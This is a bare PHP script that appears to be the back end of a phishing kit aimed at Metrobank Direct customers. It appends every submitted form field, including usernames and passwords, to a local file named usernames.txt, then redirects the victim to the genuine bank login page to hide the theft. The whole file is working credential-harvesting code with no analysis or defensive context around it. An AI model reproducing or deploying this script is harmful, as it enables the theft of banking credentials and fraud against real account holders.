
 <?php

header ('Location: https://personal.metrobankdirect.com/RetailInternetPortal/');
$handle = fopen("usernames.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
echo $_POST["username"];

?>